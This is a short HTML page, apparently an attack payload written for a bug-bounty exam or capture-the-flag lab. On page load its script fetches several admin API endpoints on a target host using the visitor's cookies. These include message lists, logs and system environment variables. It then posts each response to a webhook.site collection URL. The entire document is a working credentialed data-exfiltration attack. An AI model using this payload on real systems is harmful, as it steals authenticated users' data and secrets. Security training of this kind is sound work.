<!DOCTYPE html>
<html>
<body>
    <script>
        const webh = "https://webhook.site/6b0b4772-6bdc-417e-a83a-2403f5690ef1";
        const base = "https://api-bugbounty-exam.hashacademy.co";

        const targets = [
            "/api/admin/messages",              // List all messages (High Probability)
            "/api/admin/contact/messages",      // Variation of the list
            "/api/admin/system/env",            // Look for HASH{...} in env vars
            "/api/admin/logs",                  // Standard admin logs
            "/api/admin/me"                     // Alternative profile path
        ];

        targets.forEach(path => {
            fetch(base + path, { credentials: "include" })
                .then(r => r.text())
                .then(data => {
                    fetch(webh, {
                        method: "POST",
                        body: JSON.stringify({ path: path, data: data })
                    });
                }).catch(e => {});
        });
    </script>
</body>
</html>
